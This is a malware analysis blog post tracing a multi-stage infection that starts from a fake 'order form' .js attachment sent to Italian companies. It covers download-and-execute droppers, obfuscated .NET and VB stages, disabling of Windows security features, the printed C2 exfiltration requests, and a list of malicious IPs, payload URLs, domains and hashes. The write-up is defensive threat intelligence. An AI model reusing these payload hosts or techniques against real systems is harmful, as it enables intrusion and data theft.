@@ -1,0 +1,61 @@
+
+					False Flag Attack on Multi Stage Delivery of Malware to Italian Organisations					
+Everything started from a well edited Italian language email (given to me from a colleague of mine, thank you Luca!) reaching out many Italian companies. The Italian language email had a weird attachment: ordine_065.js (it would be “Order Form” in English) which appeared “quite malicious” to me.
+By editing the. js attachment it becomes clear that it is not an “order form” but contrary it turns out to be a downloader. The following image shows the .JS content. Our reverse adventure is going to start: we are facing a first stage of infection.
+The romantic dropper (code on the previous image) downloads and executes a PE file (let’s call it Second stage) from 31.148.99.254. The IP address seems to be hosted by a telecommunication company who sells cloud services such as: dedicated servers, colocation systems, and so on located in Ukraine. The used language in the current stage perfectly fits the dropping website language. Please keep in mind this language since later on, it would become a nice find.
+By listing the http://31.148.99.254, we might appreciate a nice malware ‘implant’ where multiple files are in place, probably to serve multiple attack vectors (es: emails, or tag inclusions, or script inclusion into benevolent html files). My first analysis was on obf.txt (the following image shows a small piece of it) which woke up my curiosity.
+That piece of VB code, could be used to obfuscate VBScripts. Many pieces of code belonging to obf.txt are related to the Russian Script-Coding.com thread where dab00 published it on  2011. Another interesting file is the Certificate.js which shows the following code.
+Quite an original technique to hide a Javascript File ! As you might see private and public keys are quoted by resulting a valid .js file which would be correctly interpreted by a js engine. Following this way, before getting into our real attack path represented by the set.tmp file, from Stage: 1 (ref. Image Stage: 1), the decision landed on performing some slow and intensive manual transformations in order to evaluate the result of GET “http://88.99.112.78/js/P8uph16W” (content in the following image). Certificate.js gets that data and evaluates it through the function: eval(“”+Cs+””)
+Once beautified it becomes easier to read:
+Now, it’s obvious that it tries to: (i) download stat.exe from third party web sources, (ii) to rename the downloaded file using the Math.random().toString(36).substr(2, 9) + “.exe” and to (iii) launch it by using the var VTmBaOw = new ActiveXObject(“WScript.Shell”);  This is super fun and interesting but I am getting far away from my original attack path.
+So, let’s assume the downloaded file are the same (really they are not) and let’s get back to our original Stage 1 where a romantic .JS dropper downloads the “set.tmp” file and executes it  (please refer to image Stage 1: Downloader).
+The dropped file is: 00b42e2b18239585ed423e238705e501aa618dba which is actually evading SandBoxes and AntiVirus engines. It is a PE file which has been implemented in a valid .NET compiled source. Let’s call it Stage 2, since coming after the Stage 1 ;). Decompiling the “Second stage” some “ambiguous and oriental characters” appear as content in the “array” variable (please refer to the following code image).
+The decrypted new stage (named: Stage 3) happens to be an interpreted PE file as well!  It is built over Microsoft VisualBasic technology (Do you remember the  Lateral Analysis ??) and it’s hardly obfuscated (maybe from obf.txt ? … of course !). The following image shows the Third Stage structure.
+The service module tries to spawn a windows service and to disable many Windows features such as for example (but not limited to): EnableLUA, DisableCMD, DisableTaskMgr, etc… The following image shows some of the described actions.
+Finally the RunPE modules decrypts a further encrypted and embedded resource an tries to run it. The following images show the decryption loop following by the decrypted payload.
+ 
+ 
+ 
+ 
+
+​
+The resulting .bat file tries to execute (through cmd.exe /c)  %1 within the parameter %2 as shown in the next picture. If the file to be executed does not exist in HD it deletes the original file as well (itself).
+%1 is an additional dropped PE File while %2 is a “random” value (key? unique id?).
+ 
+Once the sample is run it performs external requests such the following ones, exfiltrating encrypted informations:
+
+GET /htue503dt/images/uAsMyeumP3uQ/LlAgNzHCWo8/XespJetlxPFFIY/VWK7lnAXnqTCYVX_2BL6O/vcjvx6b8nqcXQKN3/J6ga_2FN2zw6Dv6/r5EUJoPCeuwDIczvFL/kxAqCE1du/yzpHeaF3r0pY4KFUCyu0/jDoN_2BArkLgWaG/fFDxP.gif HTTP/1.1
+POST /htue503dt/images/YtDKOb7fgj_2B10L/MN3zDY9V3IPW9vr/JSboSiHV4TAM_2BoCU/LocIRD_2B/MEDnB2QG_2Bf2dbtio8H/_2BLdLdN21RuRQj3xt2/SDWwjjE2JeHnPcsubnBWMG/NJUCRhlTnTa9c/5Dzpqg92/AypuGS6etix2MQvl1C8/V.bmp HTTP/1.1
+Conclusions:
+Index Of Compromise:
+Following some of the most interesting Index Of Compromise.
+http://88.99.112.78/
+http://31.148.99.254/
+http://mezzelune.com/arch/stat.exe
+http://online.allscapelawnservices.com/arch/stat.exe
+http://quotidianoannunci.it/arch/stat.exe
+9b8251c21cf500dcb757f68b8dc4164ebbcbf6431282f0b0e114c415f8d84ad0
+6456cd84f81b613e35b75ff47f4ccd4d83ec8634b5dcdf77f915fe7380106b28
+5ab04878b630d1e0598fb6f74570f653a6bd0753dad9ef55ecf467bee7e618e1
+3fc092b52e6220713d2cb098c6d11a56575c241f
+610df2672d7cae29e48118a27c4cb2a531e6399b
+c304502aa7217399acc0162f41da00dc4add4105
+magicians-blog.info
+ozarkpatternconcrete.info
+androidtutorials.info
+executenet.pw
+base.vuquoctrung.info/htue503dt
+base.magicians-blog.info/htue503dt
+base.ozarkpatternconcrete.info/htue503dt
+base.androidtutorials.info/htue503dt
+executenet.pw/htue503dt
+The analysis is also available at:
+http://marcoramilli.blogspot.com/2017/06/false-flag-attack-on-multi-stage.html
+About the author: Marco Ramilli, Founder of Yoroi
+I am a computer security scientist with an intensive hacking background. I do have a MD in computer engineering and a PhD on computer security from University of Bologna. During my PhD program I worked for US Government (@ National Institute of Standards and Technology, Security Division) where I did intensive researches in Malware evasion techniques and penetration testing of electronic voting systems.
+ 
+I do have experience on security testing since I have been performing penetration testing on several US electronic voting systems. I’ve also been encharged of testing uVote voting system from the Italian Minister of homeland security. I met Palantir Technologies where I was introduced to the Intelligence Ecosystem. I decided to amplify my cyber security experiences by diving into SCADA security issues with some of the most biggest industrial aglomerates in Italy. I finally decided to found Yoroi: an innovative Managed Cyber Security Service Provider developing some of the most amazing cyber security defence center I’ve ever experienced ! Now I technically lead Yoroi defending our customers strongly believing in: Defence Belongs To Humans
+ 
+ 
+Pierluigi Paganini
+(Security Affairs – False Flag malware)
